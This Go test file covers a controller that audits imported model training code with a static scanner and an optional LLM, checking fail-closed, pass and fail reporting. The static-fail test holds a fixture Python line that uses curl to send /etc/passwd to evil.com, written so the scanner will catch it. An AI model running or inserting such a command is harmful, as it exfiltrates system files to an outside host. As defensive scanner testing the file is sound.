package controller

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"taa/internal/codeaudit"
)

func TestLLMAvailable(t *testing.T) {
	ready := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/tags" {
			t.Fatalf("path = %s, want /api/tags", r.URL.Path)
		}
		_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
	}))
	defer ready.Close()

	if !llmAvailable(ready.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = false, want true for ready server")
	}
	if llmAvailable(ready.URL, "nonexistent-model") {
		t.Fatal("llmAvailable = true, want false for missing model")
	}

	down := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer down.Close()
	if llmAvailable(down.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for 500 response")
	}

	if llmAvailable("", "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for empty endpoint")
	}
}

func TestAuditAndReportModelImportFailClosed(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 模拟 LLM 服务不可用（返回 500）。
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer llmDown.Close()

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, Endpoint: llmDown.URL, Model: "qwen2.5-coder:0.5b", FailClosed: true}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (fail-closed)", rr.Code)
		}
		if rr.Msg == nil || !strings.Contains(*rr.Msg, "fail-closed") {
			t.Fatalf("msg = %v, want fail-closed message", rr.Msg)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport (fail-closed)")
	}
}

func TestAuditAndReportModelImportStaticFail(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := `import subprocess
subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (static audit failure)", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if audit.Conclusion.Passed {
			t.Fatal("conclusion.passed = true, want false")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportModelImport (static fail)")
	}
}

func TestAuditAndReportModelImportStaticPass(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false} // 仅静态扫描
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if !audit.Conclusion.Passed {
			t.Fatalf("conclusion.passed = false, want true")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportModelImport (static pass)")
	}
}
